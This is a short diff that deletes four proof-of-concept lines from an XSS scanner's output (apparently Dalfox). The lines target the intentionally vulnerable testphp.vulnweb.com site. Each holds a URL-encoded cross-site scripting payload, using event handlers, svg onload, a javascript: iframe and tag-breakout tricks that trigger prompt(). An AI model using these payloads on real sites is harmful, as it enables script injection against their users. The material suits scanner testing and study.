@@ -1,4 +1,0 @@
-[POC][V][GET][inATTR-double(3)-URL] http://testphp.vulnweb.com/hpp/?pp=12%22onmouseenter%3Dprompt%28calfcrusher%29+class%3Ddalfox+
-[POC][V][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/hpp/params.php?p=valid%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dprompt.valueOf%28%29%28calfcrusher%29+class%3Ddalfox%3E&pp=12
-[POC][R][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprompt.valueOf%28%29%28calfcrusher%29%3E%3C%2FiFramE%3E
-[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12%22%3E%3Csvg%2FOnLoad%3D%22%60%24%7Bprompt%60%60%7D%60%22+class%3Ddalfox%3E
